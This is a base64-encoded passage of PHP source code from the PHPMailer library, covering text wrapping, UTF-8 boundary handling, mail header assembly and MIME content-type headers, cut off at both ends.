RSk7CiAgICAgICAgJG1lc3NhZ2UgPSBzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcygkbWVzc2FnZSk7CiAgICAgICAgLy9SZW1vdmUgYSB0cmFpbGluZyBsaW5lIGJyZWFrCiAgICAgICAgaWYgKHN1YnN0cigkbWVzc2FnZSwgLSRsZWxlbikgPT0gc3RhdGljOjokTEUpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSBzdWJzdHIoJG1lc3NhZ2UsIDAsIC0kbGVsZW4pOwogICAgICAgIH0KICAgICAgICAvL1NwbGl0IG1lc3NhZ2UgaW50byBsaW5lcwogICAgICAgICRsaW5lcyA9IGV4cGxvZGUoc3RhdGljOjokTEUsICRtZXNzYWdlKTsKICAgICAgICAvL01lc3NhZ2Ugd2lsbCBiZSByZWJ1aWx0IGluIGhlcmUKICAgICAgICAkbWVzc2FnZSA9ICcnOwogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgewogICAgICAgICAgICAkd29yZHMgPSBleHBsb2RlKCcgJywgJGxpbmUpOwogICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICAgICRmaXJzdHdvcmQgPSB0cnVlOwogICAgICAgICAgICBmb3JlYWNoICgkd29yZHMgYXMgJHdvcmQpIHsKICAgICAgICAgICAgICAgIGlmICgkcXBfbW9kZSBhbmQgKHN0cmxlbigkd29yZCkgPiAkbGVuZ3RoKSkgewogICAgICAgICAgICAgICAgICAgICRzcGFjZV9sZWZ0ID0gJGxlbmd0aCAtIHN0cmxlbigkYnVmKSAtICRjcmxmbGVuOwogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHNwYWNlX2xlZnQgPiAyMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRzcGFjZV9sZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmICgnPScgPT0gc3Vic3RyKCR3b3JkLCAkbGVuIC0gMSwgMSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSRsZW47CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJz0nID09IHN1YnN0cigkd29yZCwgJGxlbiAtIDIsIDEpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiAtPSAyOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHdvcmQgPSBzdWJzdHIoJHdvcmQsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICcgLiAkcGFydDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiBzcHJpbnRmKCc9JXMnLCBzdGF0aWM6OiRMRSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmIC4gJHNvZnRfYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICcnOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB3aGlsZSAoc3RybGVuKCR3b3JkKSA+IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRsZW5ndGggPD0gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRsZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNfdXRmOCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKCc9JyA9PSBzdWJzdHIoJHdvcmQsICRsZW4gLSAxLCAxKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0kbGVuOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJz0nID09IHN1YnN0cigkd29yZCwgJGxlbiAtIDIsIDEpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuIC09IDI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAkd29yZCA9IHN1YnN0cigkd29yZCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJHdvcmQpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJHBhcnQgLiBzcHJpbnRmKCc9JXMnLCBzdGF0aWM6OiRMRSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYnVmID0gJHBhcnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRidWZfbyA9ICRidWY7CiAgICAgICAgICAgICAgICAgICAgaWYgKCEkZmlyc3R3b3JkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgLj0gJyAnOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICR3b3JkOwogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGJ1ZikgPiAkbGVuZ3RoIGFuZCAnJyAhPSAkYnVmX28pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1Zl9vIC4gJHNvZnRfYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkd29yZDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkZmlyc3R3b3JkID0gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuIHN0YXRpYzo6JExFOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJG1lc3NhZ2U7CiAgICB9CiAgICAvKioKICAgICAqIEZpbmQgdGhlIGxhc3QgY2hhcmFjdGVyIGJvdW5kYXJ5IHByaW9yIHRvICRtYXhMZW5ndGggaW4gYSB1dGYtOAogICAgICogcXVvdGVkLXByaW50YWJsZSBlbmNvZGVkIHN0cmluZy4KICAgICAqIE9yaWdpbmFsIHdyaXR0ZW4gYnkgQ29saW4gQnJvd24uCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RlZFRleHQgdXRmLTggUVAgdGV4dAogICAgICogQHBhcmFtIGludCAgICAkbWF4TGVuZ3RoICAgRmluZCB0aGUgbGFzdCBjaGFyYWN0ZXIgYm91bmRhcnkgcHJpb3IgdG8gdGhpcyBsZW5ndGgKICAgICAqCiAgICAgKiBAcmV0dXJuIGludAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gdXRmOENoYXJCb3VuZGFyeSgkZW5jb2RlZFRleHQsICRtYXhMZW5ndGgpCiAgICB7CiAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSBmYWxzZTsKICAgICAgICAkbG9va0JhY2sgPSAzOwogICAgICAgIHdoaWxlICghJGZvdW5kU3BsaXRQb3MpIHsKICAgICAgICAgICAgJGxhc3RDaHVuayA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2ssICRsb29rQmFjayk7CiAgICAgICAgICAgICRlbmNvZGVkQ2hhclBvcyA9IHN0cnBvcygkbGFzdENodW5rLCAnPScpOwogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlbmNvZGVkQ2hhclBvcykgewogICAgICAgICAgICAgICAgLy8gRm91bmQgc3RhcnQgb2YgZW5jb2RlZCBjaGFyYWN0ZXIgYnl0ZSB3aXRoaW4gJGxvb2tCYWNrIGJsb2NrLgogICAgICAgICAgICAgICAgLy8gQ2hlY2sgdGhlIGVuY29kZWQgYnl0ZSB2YWx1ZSAodGhlIDIgY2hhcnMgYWZ0ZXIgdGhlICc9JykKICAgICAgICAgICAgICAgICRoZXggPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrICsgJGVuY29kZWRDaGFyUG9zICsgMSwgMik7CiAgICAgICAgICAgICAgICAkZGVjID0gaGV4ZGVjKCRoZXgpOwogICAgICAgICAgICAgICAgaWYgKCRkZWMgPCAxMjgpIHsKICAgICAgICAgICAgICAgICAgICAvLyBTaW5nbGUgYnl0ZSBjaGFyYWN0ZXIuCiAgICAgICAgICAgICAgICAgICAgLy8gSWYgdGhlIGVuY29kZWQgY2hhciB3YXMgZm91bmQgYXQgcG9zIDAsIGl0IHdpbGwgZml0CiAgICAgICAgICAgICAgICAgICAgLy8gb3RoZXJ3aXNlIHJlZHVjZSBtYXhMZW5ndGggdG8gc3RhcnQgb2YgdGhlIGVuY29kZWQgY2hhcgogICAgICAgICAgICAgICAgICAgIGlmICgkZW5jb2RlZENoYXJQb3MgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggLT0gJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7CiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGRlYyA+PSAxOTIpIHsKICAgICAgICAgICAgICAgICAgICAvLyBGaXJzdCBieXRlIG9mIGEgbXVsdGkgYnl0ZSBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAvLyBSZWR1Y2UgbWF4TGVuZ3RoIHRvIHNwbGl0IGF0IHN0YXJ0IG9mIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggLT0gJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zOwogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjIDwgMTkyKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gTWlkZGxlIGJ5dGUgb2YgYSBtdWx0aSBieXRlIGNoYXJhY3RlciwgbG9vayBmdXJ0aGVyIGJhY2sKICAgICAgICAgICAgICAgICAgICAkbG9va0JhY2sgKz0gMzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vIE5vIGVuY29kZWQgY2hhcmFjdGVyIGZvdW5kCiAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRtYXhMZW5ndGg7CiAgICB9CiAgICAvKioKICAgICAqIEFwcGx5IHdvcmQgd3JhcHBpbmcgdG8gdGhlIG1lc3NhZ2UgYm9keS4KICAgICAqIFdyYXBzIHRoZSBtZXNzYWdlIGJvZHkgdG8gdGhlIG51bWJlciBvZiBjaGFycyBzZXQgaW4gdGhlIFdvcmRXcmFwIHByb3BlcnR5LgogICAgICogWW91IHNob3VsZCBvbmx5IGRvIHRoaXMgdG8gcGxhaW4tdGV4dCBib2RpZXMgYXMgd3JhcHBpbmcgSFRNTCB0YWdzIG1heSBicmVhayB0aGVtLgogICAgICogVGhpcyBpcyBjYWxsZWQgYXV0b21hdGljYWxseSBieSBjcmVhdGVCb2R5KCksIHNvIHlvdSBkb24ndCBuZWVkIHRvIGNhbGwgaXQgeW91cnNlbGYuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRXb3JkV3JhcCgpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5Xb3JkV3JhcCA8IDEpIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgICAgICAgY2FzZSAnYWx0JzoKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT53cmFwVGV4dCgkdGhpcy0+QWx0Qm9keSwgJHRoaXMtPldvcmRXcmFwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgJHRoaXMtPkJvZHkgPSAkdGhpcy0+d3JhcFRleHQoJHRoaXMtPkJvZHksICR0aGlzLT5Xb3JkV3JhcCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CiAgICAvKioKICAgICAqIEFzc2VtYmxlIG1lc3NhZ2UgaGVhZGVycy4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgYXNzZW1ibGVkIGhlYWRlcnMKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNyZWF0ZUhlYWRlcigpCiAgICB7CiAgICAgICAgJHJlc3VsdCA9ICcnOwogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0RhdGUnLCAnJyA9PSAkdGhpcy0+TWVzc2FnZURhdGUgPyBzZWxmOjpyZmNEYXRlKCkgOiAkdGhpcy0+TWVzc2FnZURhdGUpOwogICAgICAgIC8vIFRvIGJlIGNyZWF0ZWQgYXV0b21hdGljYWxseSBieSBtYWlsKCkKICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7CiAgICAgICAgICAgIGlmICgnbWFpbCcgIT0gJHRoaXMtPk1haWxlcikgewogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U2luZ2xlVG9BcnJheVtdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPnRvKSA+IDApIHsKICAgICAgICAgICAgICAgIGlmICgnbWFpbCcgIT0gJHRoaXMtPk1haWxlcikgewogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1RvJywgJHRoaXMtPnRvKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlaWYgKGNvdW50KCR0aGlzLT5jYykgPT0gMCkgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnRnJvbScsIFtbdHJpbSgkdGhpcy0+RnJvbSksICR0aGlzLT5Gcm9tTmFtZV1dKTsKICAgICAgICAvLyBzZW5kbWFpbCBhbmQgbWFpbCgpIGV4dHJhY3QgQ2MgZnJvbSB0aGUgaGVhZGVyIGJlZm9yZSBzZW5kaW5nCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5jYykgPiAwKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0NjJywgJHRoaXMtPmNjKTsKICAgICAgICB9CiAgICAgICAgLy8gc2VuZG1haWwgYW5kIG1haWwoKSBleHRyYWN0IEJjYyBmcm9tIHRoZSBoZWFkZXIgYmVmb3JlIHNlbmRpbmcKICAgICAgICBpZiAoKAogICAgICAgICAgICAgICAgJ3NlbmRtYWlsJyA9PSAkdGhpcy0+TWFpbGVyIG9yICdxbWFpbCcgPT0gJHRoaXMtPk1haWxlciBvciAnbWFpbCcgPT0gJHRoaXMtPk1haWxlcgogICAgICAgICAgICApCiAgICAgICAgICAgIGFuZCBjb3VudCgkdGhpcy0+YmNjKSA+IDAKICAgICAgICApIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnQmNjJywgJHRoaXMtPmJjYyk7CiAgICAgICAgfQogICAgICAgIGlmIChjb3VudCgkdGhpcy0+UmVwbHlUbykgPiAwKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1JlcGx5LVRvJywgJHRoaXMtPlJlcGx5VG8pOwogICAgICAgIH0KICAgICAgICAvLyBtYWlsKCkgc2V0cyB0aGUgc3ViamVjdCBpdHNlbGYKICAgICAgICBpZiAoJ21haWwnICE9ICR0aGlzLT5NYWlsZXIpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnU3ViamVjdCcsICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpKTsKICAgICAgICB9CiAgICAgICAgLy8gT25seSBhbGxvdyBhIGN1c3RvbSBtZXNzYWdlIElEIGlmIGl0IGNvbmZvcm1zIHRvIFJGQyA1MzIyIHNlY3Rpb24gMy42LjQKICAgICAgICAvLyBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNTMyMiNzZWN0aW9uLTMuNi40CiAgICAgICAgaWYgKCcnICE9ICR0aGlzLT5NZXNzYWdlSUQgYW5kIHByZWdfbWF0Y2goJy9ePC4qQC4qPiQvJywgJHRoaXMtPk1lc3NhZ2VJRCkpIHsKICAgICAgICAgICAgJHRoaXMtPmxhc3RNZXNzYWdlSUQgPSAkdGhpcy0+TWVzc2FnZUlEOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5sYXN0TWVzc2FnZUlEID0gc3ByaW50ZignPCVzQCVzPicsICR0aGlzLT51bmlxdWVpZCwgJHRoaXMtPnNlcnZlckhvc3RuYW1lKCkpOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdNZXNzYWdlLUlEJywgJHRoaXMtPmxhc3RNZXNzYWdlSUQpOwogICAgICAgIGlmIChudWxsICE9PSAkdGhpcy0+UHJpb3JpdHkpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnWC1Qcmlvcml0eScsICR0aGlzLT5Qcmlvcml0eSk7CiAgICAgICAgfQogICAgICAgIGlmICgnJyA9PSAkdGhpcy0+WE1haWxlcikgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKAogICAgICAgICAgICAgICAgJ1gtTWFpbGVyJywKICAgICAgICAgICAgICAgICdQSFBNYWlsZXIgJyAuIHNlbGY6OlZFUlNJT04KICAgICAgICAgICAgKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXlYbWFpbGVyID0gdHJpbSgkdGhpcy0+WE1haWxlcik7CiAgICAgICAgICAgIGlmICgkbXlYbWFpbGVyKSB7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdYLU1haWxlcicsICRteVhtYWlsZXIpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgnJyAhPSAkdGhpcy0+Q29uZmlybVJlYWRpbmdUbykgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdEaXNwb3NpdGlvbi1Ob3RpZmljYXRpb24tVG8nLCAnPCcgLiAkdGhpcy0+Q29uZmlybVJlYWRpbmdUbyAuICc+Jyk7CiAgICAgICAgfQogICAgICAgIC8vIEFkZCBjdXN0b20gaGVhZGVycwogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5DdXN0b21IZWFkZXIgYXMgJGhlYWRlcikgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKAogICAgICAgICAgICAgICAgdHJpbSgkaGVhZGVyWzBdKSwKICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIodHJpbSgkaGVhZGVyWzFdKSkKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdNSU1FLVZlcnNpb24nLCAnMS4wJyk7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmdldE1haWxNSU1FKCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQogICAgLyoqCiAgICAgKiBHZXQgdGhlIG1lc3NhZ2UgTUlNRSB0eXBlIGhlYWRlcnMuCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldE1haWxNSU1FKCkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJyc7CiAgICAgICAgJGlzbXVsdGlwYXJ0ID0gdHJ1ZTsKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgICAgICAgY2FzZSAnaW5saW5lJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9SRUxBVEVEIC4gJzsnKTsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYXR0YWNoJzoKICAgICAgICAgICAgY2FzZSAnaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCBzdGF0aWM6OkNPTlRFTlRfVFlQRV9NVUxUSVBBUlRfTUlYRUQgLiAnOycpOwogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHQnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9BTFRFUk5BVElWRSAuICc7Jyk7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAvLyBDYXRjaGVzIGNhc2UgJ3BsYWluJzogYW5kIGNhc2UgJyc6CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnQ29udGVudC1UeXBlOiAnIC4gJHRoaXMtPkNvbnRlbnRUeXBlIC4gJzsgY2hhcnNldD0nIC4gJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgJGlzbXVsdGlwYXJ0ID0gZmFsc2U7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgLy8gUkZDMTM0MSBwYXJ0IDUgc2F5cyA3Yml0IGlzIGFzc3VtZWQgaWYgbm90IHNwZWNpZmllZAogICAgICAgIGlmIChzdGF0aWM6OkVOQ09ESU5HXzdCSVQgIT0gJHRoaXMtPkVuY29kaW5nKSB7CiAgICAgICAgICAgIC8vIFJGQyAyMDQ1IHNlY3Rpb24gNi40IHNheXMgbXVsdGlwYXJ0IE1JTUUgcGFydHMgbWF5IG9ubHkgdXNlIDdiaXQsIDhiaXQgb3IgYmluYXJ5IENURQogICAgICAgICAgICBpZiAoJGlzbXVsdGlwYXJ0KSB7CiAgICAgICAgICAgICAgICBpZiAoc3RhdGljOjpFTkNPRElOR184QklUID09ICR0aGlzLT5FbmNvZGluZykgewogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCBzdGF0aWM6OkVOQ09ESU5HXzhCSVQpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy8gVGhlIG9ubHkgcmVtYWluaW5nIGFsdGVybmF0aXZlcyBhcmUgcXVvdGVkLXByaW50YWJsZSBhbmQgYmFzZTY0LCB3aGljaCBhcmUgYm90aCA3Yml0IGNvbXBhdGlibGUKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgnbWFpbCcgIT0gJHRoaXMtPk1haWxlcikgewogICAgICAgICAgICAkcmVzdWx0IC49IHN0YXRpYzo6JExFOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KICAgIC8qKgogICAgICogUmV0dXJucyB0aGUgd2hvbGUgTUlNRSBtZXNzYWdlLgogICAgICogSW5jbHVkZXMgY29tcGxldGUgaGVhZGVycyBhbmQgYm9keS4KICAgICAqIE9ubHkgdmFsaWQgcG9zdCBwcmVTZW5kKCkuCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OnByZVNlbmQoKQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTZW50TUlNRU1lc3NhZ2UoKQogICAgewogICAgICAgIHJldHVybiBydHJpbSgkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyLCAiXG5cciIpIC4gc3RhdGljOjokTEUgLiBzdGF0aWM6OiRMRSAuICR0aGlzLT5NSU1FQm9keTsKICAgIH0KICAgIC8qKgogICAgICogQ3JlYXRlIGEgdW5pcXVlIElEIHRvIHVzZSBmb3IgYm91bmRhcmllcy4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2VuZXJhdGVJZCgpCiAgICB7CiAgICAgICAgJGxlbiA9IDMyOyAvLzMyIGJ5dGVzID0gMjU2IGJpdHMKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdyYW5kb21fYnl0ZXMnKSkgewogICAgICAgICAgICAkYnl0ZXMgPSByYW5kb21fYnl0ZXMoJGxlbik7CiAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnb3BlbnNzbF9yYW5kb21fcHNldWRvX2J5dGVzJykpIHsKICAgICAgICAgICAgJGJ5dGVzID0gb3BlbnNzbF9yYW5kb21fcHNldWRvX2J5dGVzKCRsZW4pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vVXNlIGEgaGFzaCB0byBmb3JjZSB0aGUgbGVuZ3RoIHRvIHRoZSBzYW1lIGFzIHRoZSBvdGhlciBtZXRob2RzCiAgICAgICAgICAgICRieXRlcyA9IGhhc2goJ3NoYTI1NicsIHVuaXFpZCgoc3RyaW5nKSBtdF9yYW5kKCksIHRydWUpLCB0cnVlKTsKICAgICAgICB9CiAgICAgICAgLy9XZSBkb24ndCBjYXJlIGFib3V0IG1lc3NpbmcgdXAgYmFzZTY0IGZvcm1hdCBoZXJlLCBqdXN0IHdhbnQgYSByYW5kb20gc3RyaW5nCiAgICAgICAgcmV0dXJuIHN0cl9yZXBsYWNlKFsnPScsICcrJywgJy8nXSwgJycsIGJhc2U2NF9lbmNvZGUoaGFzaCgnc2hhMjU2JywgJGJ5dGVzLCB0cnVlKSkpOwogICAgfQogICAgLyoqCiAgICAgKiBBc3NlbWJsZSB0a